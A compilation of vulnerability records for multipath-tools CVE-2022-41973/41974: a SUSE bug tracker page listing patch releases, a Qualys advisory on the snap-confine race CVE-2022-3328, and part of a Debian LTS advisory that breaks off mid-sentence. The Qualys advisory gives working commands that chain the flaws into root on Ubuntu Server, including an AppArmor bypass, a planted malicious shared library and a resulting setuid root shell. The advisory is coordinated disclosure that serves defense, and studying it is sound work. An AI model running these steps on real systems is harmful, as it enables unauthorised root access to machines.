Milestone:](page.cgi?id=glossary.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=glossary.html#assigned_to "The person in charge of resolving the bug.") | Security Team bot | | [QA Contact:](page.cgi?id=glossary.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Security Team bot | |  | | | [URL:](page.cgi?id=glossary.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") | <https://smash.suse.de/issue/340664> | | [Whiteboard:](page.cgi?id=glossary.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | CVSSv3.1:SUSE:CVE-2022-41973:6.2:(AV:... | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=glossary.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=glossary.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2022-08-25 07:36 UTC by Alexander Bergmann | | --- | --- | | Modified: | 2024-04-19 12:41 UTC ([History](show_activity.cgi?id=1202739)) | | CC List: | 5 users (show)  abergmann cathy.hu gianluca.gabrielli meissner rfrohl | |  | | | [See Also:](page.cgi?id=glossary.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Found By:](page.cgi?id=glossary.html#cf_foundby "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Services Priority:](page.cgi?id=glossary.html#cf_nts_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Business Priority:](page.cgi?id=glossary.html#cf_biz_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Blocker:](page.cgi?id=glossary.html#cf_blocker "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Marketing QA Status:](page.cgi?id=glossary.html#cf_marketing_qa_status "A custom Drop Down field in this installation of Bugzilla.") | --- | | [IT Deployment:](page.cgi?id=glossary.html#cf_it_deployment "A custom Drop Down field in this installation of Bugzilla.") | --- | |  | |  * [Clone This Bug](enter_bug.cgi?cloned_bug_id=1202739) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=1202739&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=1202739&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Comment 15](show_bug.cgi?id=1202739#c15)  Martin Wilck   2022-10-24 09:41:01 UTC  ``` Upstream Pull request <https://github.com/opensvc/multipath-tools/pull/46> created and merged in upstream multipath-tools 0.9.2.  Factory SR: 1030702 SLE15-SP5 SR: 283008 ``` [Comment 16](show_bug.cgi?id=1202739#c16)  Cathy Hu   2022-10-24 09:47:16 UTC  ``` public ``` [Comment 17](show_bug.cgi?id=1202739#c17)  Martin Wilck   2022-10-24 10:38:45 UTC  ``` Factory SR 1030843 SLE15-SP5 SR 283023  (fixed a glitch in the Factory changelog) ``` [Comment 18](show_bug.cgi?id=1202739#c18)  Marcus Meissner   2022-10-24 16:05:45 UTC  ``` cve publication request issued.  <https://www.qualys.com/2022/10/24/leeloo-multipath/leeloo-multipath.txt> ``` [Comment 19](show_bug.cgi?id=1202739#c19)  Swamp Workflow Management   2022-10-24 19:19:31 UTC  ``` SUSE-SU-2022:3712-1: An update that solves one vulnerability and has two fixes is now available.  Category: security (important) Bug References: 1202616,1202739,1204325 CVE References: CVE-2022-41974 JIRA References:  Sources used: openSUSE Leap 15.4 (src):    multipath-tools-0.7.3+173+suse.7dd1b01-150000.3.29.1 openSUSE Leap 15.3 (src):    multipath-tools-0.7.3+173+suse.7dd1b01-150000.3.29.1 SUSE Linux Enterprise Server for SAP 15 (src):    multipath-tools-0.7.3+173+suse.7dd1b01-150000.3.29.1 SUSE Linux Enterprise Server 15-LTSS (src):    multipath-tools-0.7.3+173+suse.7dd1b01-150000.3.29.1 SUSE Linux Enterprise High Performance Computing 15-LTSS (src):    multipath-tools-0.7.3+173+suse.7dd1b01-150000.3.29.1 SUSE Linux Enterprise High Performance Computing 15-ESPOS (src):    multipath-tools-0.7.3+173+suse.7dd1b01-150000.3.29.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 20](show_bug.cgi?id=1202739#c20)  Swamp Workflow Management   2022-10-24 19:20:23 UTC  ``` SUSE-SU-2022:3713-1: An update that solves one vulnerability and has two fixes is now available.  Category: security (important) Bug References: 1202616,1202739,1204325 CVE References: CVE-2022-41974 JIRA References:  Sources used: SUSE OpenStack Cloud Crowbar 9 (src):    multipath-tools-0.7.3+177+suse.b16d5dc-2.23.1 SUSE OpenStack Cloud 9 (src):    multipath-tools-0.7.3+177+suse.b16d5dc-2.23.1 SUSE Linux Enterprise Server for SAP 12-SP4 (src):    multipath-tools-0.7.3+177+suse.b16d5dc-2.23.1 SUSE Linux Enterprise Server 12-SP4-LTSS (src):    multipath-tools-0.7.3+177+suse.b16d5dc-2.23.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 21](show_bug.cgi?id=1202739#c21)  Swamp Workflow Management   2022-10-24 19:21:42 UTC  ``` SUSE-SU-2022:3711-1: An update that solves two vulnerabilities and has 6 fixes is now available.  Category: security (important) Bug References: 1197570,1199342,1199345,1199346,1199347,1201483,1202616,1202739 CVE References: CVE-2022-41973,CVE-2022-41974 JIRA References:  Sources used: openSUSE Leap 15.4 (src):    multipath-tools-0.9.0+62+suse.3e048d4-150400.4.7.1 SUSE Linux Enterprise Module for Basesystem 15-SP4 (src):    multipath-tools-0.9.0+62+suse.3e048d4-150400.4.7.1 SUSE Linux Enterprise Micro 5.3 (src):    multipath-tools-0.9.0+62+suse.3e048d4-150400.4.7.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 22](show_bug.cgi?id=1202739#c22)  Swamp Workflow Management   2022-10-24 19:22:34 UTC  ``` SUSE-SU-2022:3707-1: An update that solves two vulnerabilities and has one errata is now available.  Category: security (important) Bug References: 1187534,1202616,1202739 CVE References: CVE-2022-41973,CVE-2022-41974 JIRA References:  Sources used: SUSE Linux Enterprise Software Development Kit 12-SP5 (src):    multipath-tools-0.7.9+232+suse.cbc3754-3.14.1 SUSE Linux Enterprise Server 12-SP5 (src):    multipath-tools-0.7.9+232+suse.cbc3754-3.14.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 23](show_bug.cgi?id=1202739#c23)  Swamp Workflow Management   2022-10-24 19:23:11 UTC  ``` SUSE-SU-2022:3715-1: An update that solves one vulnerability and has two fixes is now available.  Category: security (important) Bug References: 1202616,1202739,1204325 CVE References: CVE-2022-41974 JIRA References:  Sources used: SUSE Linux Enterprise Server 12-SP2-BCL (src):    multipath-tools-0.6.2+suse20221017.514d453-71.26.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 24](show_bug.cgi?id=1202739#c24)  Swamp Workflow Management   2022-10-24 19:24:22 UTC  ``` SUSE-SU-2022:3714-1: An update that solves one vulnerability and has 8 fixes is now available.  Category: security (important) Bug References: 1118495,1125145,1125507,1131789,1134648,1139369,1202616,1202739,1204325 CVE References: CVE-2022-41974 JIRA References:  Sources used: SUSE Linux Enterprise Server 12-SP3-BCL (src):    multipath-tools-0.7.1+125+suse.c18e287-2.23.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 25](show_bug.cgi?id=1202739#c25)  Swamp Workflow Management   2022-10-24 19:25:29 UTC  ``` SUSE-SU-2022:3708-1: An update that solves two vulnerabilities and has one errata is now available.  Category: security (important) Bug References: 1187534,1202616,1202739 CVE References: CVE-2022-41973,CVE-2022-41974 JIRA References:  Sources used: SUSE Linux Enterprise Server for SAP 15-SP1 (src):    multipath-tools-0.7.9+232+suse.cbc3754-150100.3.20.1 SUSE Linux Enterprise Server 15-SP1-LTSS (src):    multipath-tools-0.7.9+232+suse.cbc3754-150100.3.20.1 SUSE Linux Enterprise Server 15-SP1-BCL (src):    multipath-tools-0.7.9+232+suse.cbc3754-150100.3.20.1 SUSE Linux Enterprise High Performance Computing 15-SP1-LTSS (src):    multipath-tools-0.7.9+232+suse.cbc3754-150100.3.20.1 SUSE Linux Enterprise High Performance Computing 15-SP1-ESPOS (src):    multipath-tools-0.7.9+232+suse.cbc3754-150100.3.20.1 SUSE Enterprise Storage 6 (src):    multipath-tools-0.7.9+232+suse.cbc3754-150100.3.20.1 SUSE CaaS Platform 4.0 (src):    multipath-tools-0.7.9+232+suse.cbc3754-150100.3.20.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 26](show_bug.cgi?id=1202739#c26)  Swamp Workflow Management   2022-10-24 19:26:45 UTC  ``` SUSE-SU-2022:3710-1: An update that solves two vulnerabilities, contains one feature and has four fixes is now available.  Category: security (important) Bug References: 1189551,1191900,1195506,1197570,1202616,1202739 CVE References: CVE-2022-41973,CVE-2022-41974 JIRA References: PED-1448 Sources used: openSUSE Leap Micro 5.2 (src):    multipath-tools-0.8.5+126+suse.8ce8da5-150300.2.14.1 openSUSE Leap 15.3 (src):    multipath-tools-0.8.5+126+suse.8ce8da5-150300.2.14.1 SUSE Linux Enterprise Module for Basesystem 15-SP3 (src):    multipath-tools-0.8.5+126+suse.8ce8da5-150300.2.14.1 SUSE Linux Enterprise Micro 5.2 (src):    multipath-tools-0.8.5+126+suse.8ce8da5-150300.2.14.1 SUSE Linux Enterprise Micro 5.1 (src):    multipath-tools-0.8.5+126+suse.8ce8da5-150300.2.14.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 27](show_bug.cgi?id=1202739#c27)  Swamp Workflow Management   2022-10-24 19:27:56 UTC  ``` SUSE-SU-2022:3709-1: An update that solves two vulnerabilities and has one errata is now available.  Category: security (important) Bug References: 1189551,1202616,1202739 CVE References: CVE-2022-41973,CVE-2022-41974 JIRA References:  Sources used: SUSE Manager Server 4.1 (src):    multipath-tools-0.8.2+182.6d41865-150200.4.14.1 SUSE Manager Retail Branch Server 4.1 (src):    multipath-tools-0.8.2+182.6d41865-150200.4.14.1 SUSE Manager Proxy 4.1 (src):    multipath-tools-0.8.2+182.6d41865-150200.4.14.1 SUSE Linux Enterprise Server for SAP 15-SP2 (src):    multipath-tools-0.8.2+182.6d41865-150200.4.14.1 SUSE Linux Enterprise Server 15-SP2-LTSS (src):    multipath-tools-0.8.2+182.6d41865-150200.4.14.1 SUSE Linux Enterprise Server 15-SP2-BCL (src):    multipath-tools-0.8.2+182.6d41865-150200.4.14.1 SUSE Linux Enterprise High Performance Computing 15-SP2-LTSS (src):    multipath-tools-0.8.2+182.6d41865-150200.4.14.1 SUSE Linux Enterprise High Performance Computing 15-SP2-ESPOS (src):    multipath-tools-0.8.2+182.6d41865-150200.4.14.1 SUSE Enterprise Storage 7 (src):    multipath-tools-0.8.2+182.6d41865-150200.4.14.1  NOTE: This line indicates an update has been released for the listed product(s). At times this might be only a partial fix. If you have questions please reach out to maintenance coordination. ``` [Comment 30](show_bug.cgi?id=1202739#c30)  Robert Frohl   2024-04-19 12:41:58 UTC  ``` done ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=1202739)
* - [XML](show_bug.cgi?ctype=xml&id=1202739)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=1202739)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D1202739)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from www.openwall.com_830be3fb_20250114_193137.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](../../../2022/12/01/1) [[thread-next>]](../../../2022/12/01/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20221130232713.GA19464@localhost.localdomain>
Date: Wed, 30 Nov 2022 23:28:27 +0000
From: Qualys Security Advisory <qsa@...lys.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: Race condition in snap-confine's must_mkdir_and_open_with_perms()
 (CVE-2022-3328)

Qualys Security Advisory

Race condition in snap-confine's must_mkdir_and_open_with_perms()
(CVE-2022-3328)

========================================================================
Contents
========================================================================

Summary
Background
Exploitation
Acknowledgments
Timeline

    I can't help but feel a missed opportunity to integrate lyrics from
    one of the best songs ever: [SNAP! - The Power (Official Video)]
        -- <https://twitter.com/spendergrsec/status/1494420041076461570>

========================================================================
Summary
========================================================================

We discovered a race condition (CVE-2022-3328) in snap-confine, a
SUID-root program installed by default on Ubuntu. In this advisory, we
tell the story of this vulnerability (which was introduced in February
2022 by the patch for CVE-2021-44731) and detail how we exploited it in
Ubuntu Server (a local privilege escalation, from any user to root) by
combining it with two vulnerabilities in multipathd (an authorization
bypass and a symlink attack, CVE-2022-41974 and CVE-2022-41973):

<https://www.qualys.com/2022/10/24/leeloo-multipath/leeloo-multipath.txt>

========================================================================
Background
========================================================================

    Like the crack of the whip, I Snap! attack
    Radical mind, day and night all the time
        -- SNAP! - The Power

In February 2022, we published CVE-2021-44731 in our "Lemmings" advisory
(<https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.txt>):
to set up a snap's sandbox, snap-confine created the temporary directory
/tmp/snap.$SNAP_NAME or reused it if it already existed, even if it did
not belong to root; a local attacker could race against snap-confine,
retain control over /tmp/snap.$SNAP_NAME, and eventually obtain full
root privileges.

This vulnerability was patched by commit acb2b4c ("cmd/snap-confine:
Prevent user-controlled race in setup_private_mount"), which introduced
a new helper function, must_mkdir_and_open_with_perms():

------------------------------------------------------------------------
142 static void setup_private_mount(const char *snap_name)
...
169         sc_must_snprintf(base_dir, sizeof(base_dir), "/tmp/snap.%s", snap_name);
...
176         base_dir_fd = must_mkdir_and_open_with_perms(base_dir, 0, 0, 0700);
------------------------------------------------------------------------
 55 static int must_mkdir_and_open_with_perms(const char *dir, uid_t uid, gid_t gid,
 56                                           mode_t mode)
 ..
 61  mkdir:
 ..
 67         if (mkdir(dir, 0700) < 0 && errno != EEXIST) {
 ..
 70         fd = open(dir, O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
 ..
 81         if (fstat(fd, &st) < 0) {
 ..
 84         if (st.st_uid != uid || st.st_gid != gid
 85             || st.st_mode != (S_IFDIR | mode)) {
...
130                 if (rename(dir, random_dir) < 0) {
...
135                 goto mkdir;
------------------------------------------------------------------------

- the temporary directory /tmp/snap.$SNAP_NAME is created at line 67, if
  it does not exist already;

- if it already exists, and if it does not belong to root (at line 84),
  then it is moved out of the way (at line 130) by rename()ing it to a
  random directory in /tmp, and its creation is retried (at line 135).

When we reviewed this patch back in December 2021, we felt very nervous
about this rename() call (because it allows a local attacker to rename()
a directory they do not own), and we advised the Ubuntu Security Team to
either not reuse the directory /tmp/snap.$SNAP_NAME at all, or to create
it in a non-world-writable directory instead of /tmp, or at least to use
renameat2(RENAME_EXCHANGE) instead of rename(). Unfortunately, all of
these ideas were deemed impractical (for example, renameat2() is not
supported by older kernel and glibc versions); moreover, we (Qualys)
failed to come up with a feasible attack plan against this rename()
call, so the patch was kept in its current form.

After the release of Ubuntu 22.04 in April 2022, we decided to revisit
snap-confine and its recent hardening changes, and we finally found a
way to exploit the rename() call in must_mkdir_and_open_with_perms().

========================================================================
Exploitation
========================================================================

    It's getting, it's getting, it's getting kinda heavy
    It's getting, it's getting, it's getting kinda hectic
        -- SNAP! - The Power

The three key ideas to exploit the rename() of /tmp/snap.$SNAP_NAME are:

1/ snap-confine operates in /tmp to create a snap's temporary directory
(/tmp/snap.$SNAP_NAME in setup_private_mount()), but it also operates in
/tmp to create the snap's *root* directory (/tmp/snap.rootfs_XXXXXX in
sc_bootstrap_mount_namespace(), where all of the Xs are randomized by
mkdtemp()), and the string rootfs_XXXXXX is accepted as a valid snap
instance name by sc_instance_name_validate() (when all of the Xs are
lowercase alphanumeric):

------------------------------------------------------------------------
286 static void sc_bootstrap_mount_namespace(const struct sc_mount_config *config)
...
288         char scratch_dir[] = "/tmp/snap.rootfs_XXXXXX";
...
291         if (mkdtemp(scratch_dir) == NULL) {
...
303         sc_do_mount(scratch_dir, scratch_dir, NULL, MS_BIND, NULL);
...
319         sc_do_mount(config->rootfs_dir, scratch_dir, NULL, MS_REC | MS_BIND,
...
331         for (const struct sc_mount * mnt = config->mounts; mnt->path != NULL;
...
342                 sc_must_snprintf(dst, sizeof dst, "%s/%s", scratch_dir,
343                                  mnt->path);
...
352                         sc_do_mount(mnt->path, dst, NULL, MS_REC | MS_BIND,
------------------------------------------------------------------------

2/ We therefore execute two instances of snap-confine in parallel:

- we block the first snap-confine immediately after it creates its root
  directory /tmp/snap.rootfs_XXXXXX at line 291 (we reliably win this
  race condition by "single-stepping" snap-confine, as explained in our
  "Lemmings" advisory);

- we execute the second snap-confine with a snap instance name of
  rootfs_XXXXXX -- i.e., the temporary directory /tmp/snap.$SNAP_NAME of
  this second snap-confine is the root directory /tmp/snap.rootfs_XXXXXX
  of the first snap-confine;

- we kill this second snap-confine immediately after it rename()s its
  temporary directory /tmp/snap.$SNAP_NAME -- i.e., the root directory
  /tmp/snap.rootfs_XXXXXX of the first snap-confine -- at line 130 (we
  reliably win this race condition with inotify, as explained in our
  "Lemmings" advisory);

- we re-create the directory /tmp/snap.rootfs_XXXXXX ourselves, and
  resume the execution of the first snap-confine, whose root directory
  now belongs to us.

3/ We can therefore create an arbitrary symlink
/tmp/snap.rootfs_XXXXXX/tmp, and sc_bootstrap_mount_namespace() will
bind-mount the real /tmp directory (which is world-writable) onto any
directory in the filesystem (because mount() will follow our arbitrary
symlink at line 352).

This ability will eventually allow us to obtain full root privileges,
but we must first solve three problems:

------------------------------------------------------------------------
Problem a/ We cannot trick snap-confine into rename()ing
/tmp/snap.rootfs_XXXXXX, because this directory belongs to root and
must_mkdir_and_open_with_perms() rename()s it only if it does not belong
to root!

This problem solves itself naturally: indeed, /tmp/snap.rootfs_XXXXXX
belongs to the user root, but it belongs to the group of our own user,
so must_mkdir_and_open_with_perms() rename()s it because it does not
belong to the group root (at line 84).

------------------------------------------------------------------------
Problem b/ We cannot trick snap-confine into following our symlink
/tmp/snap.rootfs_XXXXXX/tmp, because sc_bootstrap_mount_namespace()
bind-mounts a read-only squashfs onto /tmp/snap.rootfs_XXXXXX (at line
319): if we create our symlink before this bind-mount, then it becomes
covered by the squashfs; and we cannot create our symlink after this
bind-mount, because the squashfs is read-only and belongs to root!

The "Prologue: CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount"
of our "Lemmings" advisory suggests a solution to this problem: we must
unmount /tmp/snap.rootfs_XXXXXX each time sc_bootstrap_mount_namespace()
bind-mounts it (at lines 303 and 319). The "(deleted)" technique we used
in "Lemmings" (CVE-2021-3996 in util-linux) was patched in January 2022,
but we found a surprisingly simple workaround:

we mount a FUSE filesystem onto /tmp/snap.rootfs_XXXXXX, immediately
after we re-create this directory ourselves; this allows us to unmount
(with fusermount -u -z) any subsequent bind-mounts (even if they belong
to root), because fusermount does not check that our FUSE filesystem is
indeed the most recently mounted filesystem on /tmp/snap.rootfs_XXXXXX.

------------------------------------------------------------------------
Problem c/ We cannot trick snap-confine into bind-mounting the real /tmp
onto an arbitrary directory in the filesystem (at line 352), because
such a bind-mount is forbidden by snap-confine's AppArmor profile!

To solve this problem, we must bypass AppArmor completely, but the
technique we used in our "Lemmings" advisory (we wrapped snap-confine's
execution in an AppArmor profile that was in "complain" mode, not in
"enforce" mode) was patched in February 2022 (by commits 26eed65 and
4a2eb78, "ensure that snap-confine is in strict confinement" and
"Tighten AppArmor label check"):

now, snap-confine's execution must be wrapped in an AppArmor profile
that is in "enforce" mode and whose label matches the regular expression
"^(/snap/(snapd|core)/x?[0-9]+/usr/lib|/usr/lib(exec)?)/snapd/snap-confine$".

We were about to give up on trying to exploit snap-confine, when we
discovered CVE-2022-41974 and CVE-2022-41973 in multipathd (which is
installed by default on Ubuntu Server): these two vulnerabilities allow
us to create a directory named "failed_wwids" (user root, group root,
mode 0700) anywhere in the filesystem, and we were able to transform
this very limited directory creation into a complete AppArmor bypass.

AppArmor supports policy namespaces that are loosely related to kernel
user namespaces; by default, no AppArmor namespaces exist:

------------------------------------------------------------------------
$ ls -la /sys/kernel/security/apparmor/policy/namespaces
total 0
drwxr-xr-x 2 root root 0 Aug  6 12:42 .
drwxr-xr-x 5 root root 0 Aug  6 12:42 ..
------------------------------------------------------------------------

However, we (attackers) can create an AppArmor namespace "failed_wwids"
by exploiting CVE-2022-41974 and CVE-2022-41973 in multipathd:

------------------------------------------------------------------------
$ ln -s /sys/kernel/security/apparmor/policy/namespaces /dev/shm/multipath

$ multipathd list devices | grep 'whitelisted, unmonitored'
    sda1 devnode whitelisted, unmonitored
    ...

$ multipathd list list path sda1
fail

$ ls -la /sys/kernel/security/apparmor/policy/namespaces
total 0
drwxr-xr-x 3 root root 0 Aug  6 12:42 .
drwxr-xr-x 5 root root 0 Aug  6 12:42 ..
drwx------ 5 root root 0 Aug  6 13:38 failed_wwids
------------------------------------------------------------------------

Then, we can enter this AppArmor namespace by creating and entering an
unprivileged user namespace:

------------------------------------------------------------------------
$ aa-exec -n failed_wwids -p unconfined -- unshare -U -r /bin/sh
------------------------------------------------------------------------

Inside this namespace, we can create an AppArmor profile labeled
"/usr/lib/snapd/snap-confine" that is in "enforce" mode and allows all
possible operations:

------------------------------------------------------------------------
# apparmor_parser -K -a << "EOF"
/usr/lib/snapd/snap-confine (enforce) {
capability,
network,
mount,
remount,
umount,
pivot_root,
ptrace,
signal,
dbus,
unix,
file,
change_profile,
}
EOF
------------------------------------------------------------------------

Back in the initial namespace, we check that our "allow all" AppArmor
profile still exists:

------------------------------------------------------------------------
# aa-status
apparmor module is loaded.
32 profiles are loaded.
32 profiles are in enforce mode.
   ...
   :failed_wwids:/usr/lib/snapd/snap-confine
------------------------------------------------------------------------

Last, we make sure that snap-confine accepts our "allow all" AppArmor
profile (i.e., AppArmor is bypassed, and snap-confine is effectively
unconfined):

------------------------------------------------------------------------
$ env -i SNAPD_DEBUG=1 SNAP_INSTANCE_NAME=lxd aa-exec -n failed_wwids -p /usr/lib/snapd/snap-confine -- /usr/lib/snapd/snap-confine --base lxd snap.lxd.daemon /nonexistent
...
DEBUG: apparmor label on snap-confine is: /usr/lib/snapd/snap-confine
DEBUG: apparmor mode is: enforce
------------------------------------------------------------------------

We can therefore bind-mount /tmp onto an arbitrary directory in the
filesystem (by exploiting CVE-2022-3328); since we already depend on
multipathd to bypass AppArmor, we bind-mount /tmp onto /lib/multipath,
create our own shared library /lib/multipath/libchecktur.so, shutdown
multipathd (by exploiting CVE-2022-41974), restart multipathd (through
its Unix socket), and finally obtain full root privileges (because
multipathd executes our shared library as root when it restarts):

------------------------------------------------------------------------
$ grep multipath /proc/self/mountinfo | wc
      0       0       0

$ gcc -o CVE-2022-3328 CVE-2022-3328.c
$ ./CVE-2022-3328
scratch directory for constructing namespace: /tmp/snap.rootfs_0j4u9c

$ grep multipath /proc/self/mountinfo
1395 29 253:0 /tmp /usr/lib/multipath rw,relatime shared:1 - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
...

$ gcc -fpic -shared -o /lib/multipath/libchecktur.so libtmpsh.c

$ ps -ef | grep 'multipath[d]'
root         371       1  0 12:42 ?        00:00:00 /sbin/multipathd -d -s

$ multipathd list list add del switch sus resu rei fai resi rese rel forc dis rest paths maps path P map P gro P rec dae statu stats top con bla dev raw wil quit
ok

$ ps -ef | grep 'multipath[d]' | wc
      0       0       0

$ ls -l /tmp/sh
ls: cannot access '/tmp/sh': No such file or directory

$ multipathd list daemon
error -104 receiving packet

$ ls -l /tmp/sh
-rwsr-xr-x 1 root root 125688 Aug  6 14:55 /tmp/sh

$ /tmp/sh -p
# id
uid=65534(nobody) gid=65534(nogroup) euid=0(root) groups=65534(nogroup)
                                     ^^^^^^^^^^^^
------------------------------------------------------------------------

========================================================================
Acknowledgments
========================================================================

We thank the Ubuntu security team (Alex Murray and Seth Arnold in
particular) and the snapd team for their hard work on this snap-confine
vulnerability. We also thank the members of linux-distros@...nwall.

========================================================================
Timeline
========================================================================

2022-08-23: Contacted security@...ntu.

2022-11-28: Contacted linux-distros@...nwall.

2022-11-30: Coordinated Release Date (17:00 UTC).

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from lists.debian.org_763ad8de_20250114_193140.html ===


---

[[Date Prev](msg00036.html)][[Date Next](msg00038.html)]
[[Thread Prev](msg00036.html)][[Thread Next](msg00038.html)]
[[Date Index](maillist.html#00037)]
[[Thread Index](threads.html#00037)]

# [SECURITY] [DLA 3250-1] multipath-tools security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3250-1] multipath-tools security update
* *From*: Tobias Frost <tobi@debian.org>
* *Date*: Thu, 29 Dec 2022 11:45:35 +0100
* *Message-id*: <Y61vzwjiFwMz/zFA@isildor.loewenhoehle.ip>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-3250-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                         Tobias Frost
December 29, 2022                             <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : multipath-tools
Version        : 0.7.9-3+deb10u2
CVE ID         : CVE-2022-41973 CVE-2022-41974
Debian Bug     : 1022742

Multiple issues were found in multipath-tools, a tool-chain to manage disk
multipath device maps, which may be used by local attackers to obtain root
privileges or create a directories or overwrite files via symlink attacks.

Please note that the fix for CVE-2022-41973 involves switching from
/dev/shm to systemd-tmpfiles (/run/multipath-tools).
If you have previously accesssed /dev/shm directly, please update your
setup to the new path to facilitate this change.

CVE-2022-41973

    multipath-tools 0.7.7 through 0.9.x before 0.9.2 allows local users to
    obtain root access, as exploited in conjunction with CVE-2022-41974.
    Local users able to access /dev/shm can change symlinks in multipathd
    due to incorrect symlink handling, which could lead to controlled file
    writes outside of the /dev/shm directory. This could be used indirectly
    for local privilege escalation to root.

CVE-2022-41974

    multipath-tools 0.7.0 through 0.9.x before 0.9.2 allows local users to
    obtain root access, as exploited alone or in conjunction with
